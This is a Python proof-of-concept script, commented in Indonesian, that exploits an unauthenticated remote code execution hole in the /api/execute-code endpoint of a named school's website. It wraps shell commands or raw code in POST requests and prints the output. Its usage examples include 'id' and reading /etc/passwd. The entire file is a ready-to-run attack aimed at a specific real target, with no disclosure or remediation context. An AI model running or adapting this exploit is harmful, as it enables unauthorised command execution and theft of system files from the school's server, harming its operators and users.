#!/usr/bin/env python3
"""
PoC — Unauthenticated Remote Code Execution pada PedaGogiAI CodeStudio.

Target  : POST https://www.pedagogiai.smpm12gkb.sch.id/api/execute-code
Auth    : TIDAK ADA (endpoint publik).
Akar    : Wrapper menjalankan kode user via Judge0 1.14.0 di container
          'zag-srv02-ce-execution-worker'. "Pengamanan" hanya blacklist
          fungsi shell PER-BAHASA (PHP diblokir), sedangkan python/js/bash
          mengeksekusi command OS bebas.

Contoh:
  python3 poc_rce_execute_code.py --cmd 'id'
  python3 poc_rce_execute_code.py --cmd 'cat /etc/passwd'
  python3 poc_rce_execute_code.py --lang python --code 'import os;print(os.popen("id").read())'
  python3 poc_rce_execute_code.py --read /etc/passwd
"""
import sys, json, argparse, urllib.request

BASE = "https://www.pedagogiai.smpm12gkb.sch.id"
URL = BASE + "/api/execute-code"


def run(language: str, code: str, stdin: str = "") -> dict:
    body = json.dumps({"language": language, "code": code, "stdin": stdin}).encode()
    req = urllib.request.Request(
        URL, data=body, method="POST",
        headers={
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0",
            "Accept": "application/json",
        },
    )
    with urllib.request.urlopen(req, timeout=60) as r:
        return json.loads(r.read().decode("utf-8", "replace"))


def main():
    ap = argparse.ArgumentParser(description="Unauth RCE PedaGogiAI execute-code")
    ap.add_argument("--lang", default="bash", help="bash | python | javascript | java | cpp ...")
    ap.add_argument("--code", help="kode mentah sesuai --lang")
    ap.add_argument("--cmd", help="command shell (dibungkus: language=bash)")
    ap.add_argument("--read", help="baca file dari worker (via bash cat)")
    ap.add_argument("--stdin", default="")
    a = ap.parse_args()

    if a.cmd:
        lang, code = "bash", a.cmd
    elif a.read:
        lang, code = "bash", "cat %s" % a.read
    elif a.code is not None:
        lang, code = a.lang, a.code
    else:
        ap.print_help()
        return

    try:
        res = run(lang, code, a.stdin)
    except urllib.error.HTTPError as e:
        print("[-] HTTP %s: %s" % (e.code, e.read().decode("utf-8", "replace")[:300]))
        sys.exit(1)

    print("lang   :", lang)
    print("success:", res.get("success"))
    print("exit   :", res.get("exit_code"))
    print("--- stdout ---")
    sys.stdout.write(res.get("output", ""))
    if res.get("error"):
        print("--- stderr ---")
        sys.stdout.write(res["error"])


if __name__ == "__main__":
    main()
